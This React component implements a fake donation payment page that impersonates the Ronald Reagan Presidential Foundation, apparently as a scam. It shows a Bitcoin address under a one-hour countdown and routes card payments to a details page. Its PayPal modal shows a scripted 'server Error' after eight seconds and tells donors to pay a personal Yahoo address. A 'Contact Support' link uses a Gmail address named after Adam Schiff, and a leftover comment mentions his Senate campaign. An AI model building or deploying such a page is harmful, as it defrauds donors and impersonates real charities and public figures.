import {
  Box,
  Text,
  Image,
  Flex,
  Tabs,
  TabList,
  TabPanel,
  Tab,
  TabPanels,
  Button,
  Input,
  Checkbox,
  useDisclosure,
  Center,
  useToast,
} from '@chakra-ui/react';
import React, { useState, useEffect } from 'react';
import { RiLock2Fill } from 'react-icons/ri';
import { ImFacebook } from 'react-icons/im';
import { AiFillTwitterSquare } from 'react-icons/ai';
import { GiPerson } from 'react-icons/gi';
import { useNavigate } from 'react-router-dom';
import { FaBitcoin } from 'react-icons/fa';
import ModalLayout from '../component/modal';
import { FiLock } from 'react-icons/fi';
import { BiCopy } from 'react-icons/bi';
import { AiFillCaretLeft } from 'react-icons/ai';

const daily = ['25', '50', '100', '200', '500', '1000', '5000', '10000'];
const monthly = ['25', '50', '100', '200', '500', '1000', '5000', '10000'];

const writeUp = (
  <>
    {/* //@ts-ignore */}
    <Text fontSize={'1.2em'} color={'#3080b4ff'} textAlign={'center'}>
      {localStorage.getItem('amount')}
    </Text>

    <Text textAlign={'center'}>billed one-time</Text>
  </>
);

function Bitcoin() {
  const navigate = useNavigate();
  const { isOpen, onOpen, onClose } = useDisclosure();

  const toast = useToast();

  const copyUrl = () => {
    navigator.clipboard
      .writeText('bc1q868qszs40hd2w5p48zj6j5h0zsuw5g4upql7w5')
      .then((res) =>
        toast({
          title: 'Address Copied to clipboard',
          status: 'success',
          position: 'top',
        })
      );
  };

  const {
    isOpen: payOpen,
    onOpen: onPay,
    onClose: closeOpen,
  } = useDisclosure();

  const [time, setTime] = useState(3600);

  useEffect(() => {
    const interval = setInterval(() => {
      setTime(time - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [time]);

  const minutes = Math.floor(time / 60);
  const seconds = time % 60;

  const [showError, setShowError] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowError(true);
    }, 8000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <>
      <Flex gap='2em' justifyContent={'center'} wrap={'wrap-reverse'} my='3em'>
        <Box
          w={['100%', '', '30%']}
          bg={'#fff'}
          borderRadius={['0em', '', '1em']}
          pos={'relative'}
          overflow={'hidden'}
        >
          <Box
            bg='#1e4f6e'
            p='2em'
            color={'#fff'}
            display={'flex'}
            alignItems={'center'}
            gap={'0.2em'}
          >
            <Image
              w={'20'}
              h={'20'}
              src={
                'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679525683/sammy/rrpfi-logo_vym1ha.png'
              }
            />
            <Text> Ronald Reagan Presidential Foundation </Text>
          </Box>

          <Box
            my={'1em'}
            w={'100%'}
            h={'40vh'}
            bgPos={'center'}
            bgRepeat={'no-repeat'}
            bgSize={'cover'}
            bgImg={
              'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679524161/sammy/january2022_lightbox_mod2_vzrhme.jpg'
            }
          ></Box>

          <Text p='1em'>
            Your contributions helps to honor President Reagan's leadership,his
            works and also help the needy. This ensures his legacy remains a
            vibrant and living example for generations to come. We will continue
            to share his enduring message of individual liberty, economic
            opportunity, global democracy and national pride. Thank you for your
            support! We greatly appreciate it!
          </Text>

          <Box px='1em' my={''} display={'flex'}>
            <ImFacebook />
            <AiFillTwitterSquare />
            <GiPerson />
          </Box>

          <Box px='1em'>
            <Image
              src={
                'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679525686/sammy/4star-234x60_uyol2s.jpg'
              }
            />
          </Box>
        </Box>
        {/* order section */}
        <Box
          w={['100%', '', '30%']}
          bg={'#fff'}
          borderRadius={['0em', '', '1em']}
          pos={'relative'}
          overflow={'hidden'}
        >
          {/* <Box bg={'yellow'} my={'1em'}  w={'100%'} h={'40vh'}
              bgPos={'center'}
              bgRepeat={'no-repeat'}
              bgSize={'cover'}
              bgImg={'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679524161/sammy/january2022_lightbox_mod2_vzrhme.jpg'} >
              
          </Box> */}
          <Flex alignItems={'center'} justifyContent={'space-around'}>
            <Box onClick={(e) => window.history.back()}>
              <AiFillCaretLeft fill='red' size='1.3em' />
            </Box>

            <Text
              textAlign={'center'}
              my='1em'
              fontWeight={'bold'}
              color={'#1e4f6eff'}
            >
              {' '}
              Payment{' '}
            </Text>
            <Box justifySelf={'flex-end'}>
              <RiLock2Fill />
            </Box>
          </Flex>
          <Box px='1em' fontWeight={'bold'}>
            {writeUp}
          </Box>
          <Box px='1em' my='1em'>
            <Button
              bg='#3080b4ff'
              color={'#black'}
              border={'1px solid gray'}
              w='100%'
              _hover={{}}
              py='1.5em'
            >
              <Flex gap='0.5em'>
                <Checkbox />{' '}
                <Text>
                  Cover transaction fees of{' '}
                  <span
                    style={{
                      color: 'white',
                    }}
                  >
                    $0.36
                  </span>
                </Text>
              </Flex>
            </Button>
          </Box>

          <Box
            left={'1em'}
            bottom='1em'
            pos={['relative', 'relative', 'absolute']}
            right='1em'
          >
            <Button
              py='1.6em'
              w={'100%'}
              px='1em'
              bg='#002e64ff'
              color={'#fff'}
              _hover={{}}
              onClick={(e) => {
                navigate('/details');
                window.location.reload();
              }}
            >
              CREDIT CARD
            </Button>

            <Flex my='1em' gap={'1em'}>
              <Button
                w={'100%'}
                bg='black'
                color='#fff'
                _hover={{}}
                py='1.6em'
                onClick={onOpen}
              >
                <FaBitcoin /> {'  '} Bitcoin
              </Button>
              <Button
                bg={'#ffca40ff'}
                w={'100%'}
                _hover={{}}
                py='1.6em'
                // onClick={onPay}
                onClick={(e) => {
                navigate('/paywithpaypal');
                window.location.reload();
               }}
              
              >
                <Image
                  w={'60px'}
                  src={
                    'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679626631/sammy/download_xn3wyo.svg'
                  }
                />
              </Button>
            </Flex>
          </Box>
        </Box>
      </Flex>

      <ModalLayout isOpen={isOpen} onClose={onClose}>
        {/* <Flex justifyContent={'center'}>
          <Box textAlign={'center'}>
            <Image
              w={'50%'}
              mx={'auto'}
              src={
                'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679627302/sammy/barcode_asujtx_tjn7mr.jpg'
              }
            />

            <Text my={'1em'}>bc1qwm94jj5c3y9m83jzusr5dw90yweunp0c2tqxcg</Text>

            <Button onClick={copyUrl}>
              {' '}
              <BiCopy /> Copy
            </Button>
          </Box>
        </Flex> */}
        <Box py={'2em'} textAlign={'center'}>
          <Text color={'var(--primary)'} fontWeight={'bold'} fontSize={'1.1em'}>
            Pay with bitcoin
          </Text>
        </Box>

        <Box
          h={'20vh'}
          w={'80%'}
          bgSize={'contain'}
          bgRepeat={'no-repeat'}
          mx={'auto'}
          bgPos={'center'}
          bgImage={
            'https://res.cloudinary.com/dvvldjddt/image/upload/v1686428633/barcode_bh1tx0.jpg'
          }
        ></Box>
        

        <Box my={'1em'} w={'80%'} textAlign={'center'} mx={'auto'}>
          <Text> Send to this address</Text>

          <Text my='1.5em' fontWeight={'bold'}>
            bc1q868qszs40hd2w5p48zj6j5h0zsuw5g4upql7w5
          </Text>
          <Button onClick={copyUrl} my='1em'>
            {' '}
            <BiCopy /> Copy
          </Button>

          <Text>
            {minutes}:{seconds < 10 ? `0${seconds}` : seconds}
          </Text>
        </Box>
      </ModalLayout>

      <ModalLayout isOpen={payOpen} onClose={closeOpen}>
        <Flex justifyContent={'center'} textAlign={'center'}>
          <Box py={'2em'}>
            <Center>
              <svg
                width='80px'
                height='22'
                viewBox='0 0 101 32'
                preserveAspectRatio='xMinYMin meet'
                xmlns='http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg'
              >
                <path
                  fill='#003087'
                  d='M 12.237 2.8 L 4.437 2.8 C 3.937 2.8 3.437 3.2 3.337 3.7 L 0.237 23.7 C 0.137 24.1 0.437 24.4 0.837 24.4 L 4.537 24.4 C 5.037 24.4 5.537 24 5.637 23.5 L 6.437 18.1 C 6.537 17.6 6.937 17.2 7.537 17.2 L 10.037 17.2 C 15.137 17.2 18.137 14.7 18.937 9.8 C 19.237 7.7 18.937 6 17.937 4.8 C 16.837 3.5 14.837 2.8 12.237 2.8 Z M 13.137 10.1 C 12.737 12.9 10.537 12.9 8.537 12.9 L 7.337 12.9 L 8.137 7.7 C 8.137 7.4 8.437 7.2 8.737 7.2 L 9.237 7.2 C 10.637 7.2 11.937 7.2 12.637 8 C 13.137 8.4 13.337 9.1 13.137 10.1 Z'
                ></path>
                <path
                  fill='#003087'
                  d='M 35.437 10 L 31.737 10 C 31.437 10 31.137 10.2 31.137 10.5 L 30.937 11.5 L 30.637 11.1 C 29.837 9.9 28.037 9.5 26.237 9.5 C 22.137 9.5 18.637 12.6 17.937 17 C 17.537 19.2 18.037 21.3 19.337 22.7 C 20.437 24 22.137 24.6 24.037 24.6 C 27.337 24.6 29.237 22.5 29.237 22.5 L 29.037 23.5 C 28.937 23.9 29.237 24.3 29.637 24.3 L 33.037 24.3 C 33.537 24.3 34.037 23.9 34.137 23.4 L 36.137 10.6 C 36.237 10.4 35.837 10 35.437 10 Z M 30.337 17.2 C 29.937 19.3 28.337 20.8 26.137 20.8 C 25.037 20.8 24.237 20.5 23.637 19.8 C 23.037 19.1 22.837 18.2 23.037 17.2 C 23.337 15.1 25.137 13.6 27.237 13.6 C 28.337 13.6 29.137 14 29.737 14.6 C 30.237 15.3 30.437 16.2 30.337 17.2 Z'
                ></path>
                <path
                  fill='#003087'
                  d='M 55.337 10 L 51.637 10 C 51.237 10 50.937 10.2 50.737 10.5 L 45.537 18.1 L 43.337 10.8 C 43.237 10.3 42.737 10 42.337 10 L 38.637 10 C 38.237 10 37.837 10.4 38.037 10.9 L 42.137 23 L 38.237 28.4 C 37.937 28.8 38.237 29.4 38.737 29.4 L 42.437 29.4 C 42.837 29.4 43.137 29.2 43.337 28.9 L 55.837 10.9 C 56.137 10.6 55.837 10 55.337 10 Z'
                ></path>
                <path
                  fill='#009cde'
                  d='M 67.737 2.8 L 59.937 2.8 C 59.437 2.8 58.937 3.2 58.837 3.7 L 55.737 23.6 C 55.637 24 55.937 24.3 56.337 24.3 L 60.337 24.3 C 60.737 24.3 61.037 24 61.037 23.7 L 61.937 18 C 62.037 17.5 62.437 17.1 63.037 17.1 L 65.537 17.1 C 70.637 17.1 73.637 14.6 74.437 9.7 C 74.737 7.6 74.437 5.9 73.437 4.7 C 72.237 3.5 70.337 2.8 67.737 2.8 Z M 68.637 10.1 C 68.237 12.9 66.037 12.9 64.037 12.9 L 62.837 12.9 L 63.637 7.7 C 63.637 7.4 63.937 7.2 64.237 7.2 L 64.737 7.2 C 66.137 7.2 67.437 7.2 68.137 8 C 68.637 8.4 68.737 9.1 68.637 10.1 Z'
                ></path>
                <path
                  fill='#009cde'
                  d='M 90.937 10 L 87.237 10 C 86.937 10 86.637 10.2 86.637 10.5 L 86.437 11.5 L 86.137 11.1 C 85.337 9.9 83.537 9.5 81.737 9.5 C 77.637 9.5 74.137 12.6 73.437 17 C 73.037 19.2 73.537 21.3 74.837 22.7 C 75.937 24 77.637 24.6 79.537 24.6 C 82.837 24.6 84.737 22.5 84.737 22.5 L 84.537 23.5 C 84.437 23.9 84.737 24.3 85.137 24.3 L 88.537 24.3 C 89.037 24.3 89.537 23.9 89.637 23.4 L 91.637 10.6 C 91.637 10.4 91.337 10 90.937 10 Z M 85.737 17.2 C 85.337 19.3 83.737 20.8 81.537 20.8 C 80.437 20.8 79.637 20.5 79.037 19.8 C 78.437 19.1 78.237 18.2 78.437 17.2 C 78.737 15.1 80.537 13.6 82.637 13.6 C 83.737 13.6 84.537 14 85.137 14.6 C 85.737 15.3 85.937 16.2 85.737 17.2 Z'
                ></path>
                <path
                  fill='#009cde'
                  d='M 95.337 3.3 L 92.137 23.6 C 92.037 24 92.337 24.3 92.737 24.3 L 95.937 24.3 C 96.437 24.3 96.937 23.9 97.037 23.4 L 100.237 3.5 C 100.337 3.1 100.037 2.8 99.637 2.8 L 96.037 2.8 C 95.637 2.8 95.437 3 95.337 3.3 Z'
                ></path>
              </svg>
            </Center>

            {/* <Text my={'1.5em'}>This is the direct  PayPal email for  Adam Schiff's Senate Campaign</Text>

              <Text my={'0.8em'} color={'var(--primary)'}>{email}</Text> */}

            <Box my={'1em'}>
              <Box position={'relative'} className='loader'>
                <Center>
                  <Text
                    className='inner-load'
                    style={{ transform: 'translateZ(0) !important' }}
                  >
                    <FiLock />
                  </Text>
                </Center>
              </Box>
              {showError && (
                <Box>
                  <Text>Sorry there was a server Error</Text>

                  <Text px={'0.5em'} cursor={'pointer'}>
                    Send PayPal directly here{' '}
                    <span style={{ color: 'blue' }}>dmaryh99@yahoo.com</span>{' '}
                  </Text>
                  <a href='mailto:aschiffprivatemail@gmail.com'>
                    <Text my={'0.5em'}>OR</Text>
                    <Button my={'1.5em'}>Contact Support </Button>
                  </a>
                </Box>
              )}
            </Box>

            {/* <Button onClick={() => {
                copy(email, {
                  debug: true,
                  message: 'Press #{key} to copy',
                });
                setCopied('Copied')

              }}>{copied}</Button> */}
          </Box>
        </Flex>
      </ModalLayout>

      <Box
        display={['none', 'block']}
        w={'80%'}
        mx={'auto'}
        textAlign={'center'}
      >
        The Ronald Reagan Presidential Foundation is the nonprofit organization
        created by President Reagan himself and specifically charged by him with
        continuing his legacy and sharing his principles - individual liberty,
        economic opportunity, global democracy and national pride. The
        Foundation is a non-partisan organization which sustains the Ronald
        Reagan Presidential Library and Museum, the Reagan Center for Public
        Affairs, the Walter and Leonore Annenberg Presidential Learning Center
        and its internationally recognized, award-winning Discovery Center, and
        the Air Force One Pavilion. The Ronald Reagan Presidential Foundation is
        a not-for-profit 501(c)(3) tax exempt organization under the IRS Code,
        sections 509(a)(1) and 170(b)(1)(A)(vi) and as such contributions are
        deductible as described therein. Recurring payment enrollments can be
        cancelled at anytime by contacting us at (805)-522-2977 © 2023 - Ronald
        Reagan Presidential Foundation and Library. All Rights Reserved.
      </Box>
    </>
  );
}

export default Bitcoin;
